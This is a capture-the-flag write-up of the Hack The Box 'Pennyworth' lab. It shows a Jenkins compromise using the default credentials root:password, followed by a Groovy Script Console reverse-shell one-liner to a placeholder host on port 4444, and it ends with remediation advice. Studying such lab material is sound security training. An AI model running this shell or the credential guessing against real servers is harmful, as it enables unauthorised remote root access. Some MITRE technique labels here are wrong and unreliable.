---
title: "Hack The Box Writeup: Pennyworth"
date: 2025-12-17
description: "RCE via Jenkins Script Console due to weak administrative credentials."
tags: ["htb", "jenkins", "rce", "misconfiguration", "mitre-attack"]
layout: "page"
showPagination: true
showDate: true
showReadingTime: true
showWordCount: true
showAuthorBottom: true
---

### Executive Summary

The host exposed a Jenkins instance accessible via HTTP. Authentication was compromised through weak credentials, allowing access to the Script Console and remote command execution as **root**, resulting in a full system compromise.

### Attack Chain (PTES Mapping)

#### 1. Discovery
Scanning identified a Jetty server running Jenkins on port 8080.
```bash
sudo nmap -sS -T4 -p- -sV -O 10.129.7.209
```
* **MITRE Technique:** [T1046](https://attack.mitre.org/techniques/T1046/) - Network Service Scanning.

#### 2. Enumeration
Manual testing of common credentials (password spraying) successfully identified valid administrative access.
* **Credentials:** `root:password`
* **MITRE Technique:** [T1110.001](https://attack.mitre.org/techniques/T1110/001/) - Brute Force: Password Cracking.

#### 3. Exploitation
The Jenkins Script Console (`/script`) was used to execute Groovy code. A reverse shell was established using `ProcessBuilder` to bypass standard execution limitations.
```groovy
def pb = new ProcessBuilder("/bin/bash", "-c", "bash -i >& /dev/tcp/<IP>/4444 0>&1")
pb.redirectErrorStream(true)
pb.start()
```
* **MITRE Technique:** [T1609](https://attack.mitre.org/techniques/T1609/) - Charting/Container Orchestration: Execution in Container/Job.

### Remediation (NIST SP 800-115)

* **Identity Management:** Enforce a strong password policy and remove default/weak credentials.
* **Network Security:** Restrict access to the Jenkins interface via IP whitelisting or VPN.
* **Service Hardening:** Disable the Script Console if not required and run the Jenkins service with a non-privileged user.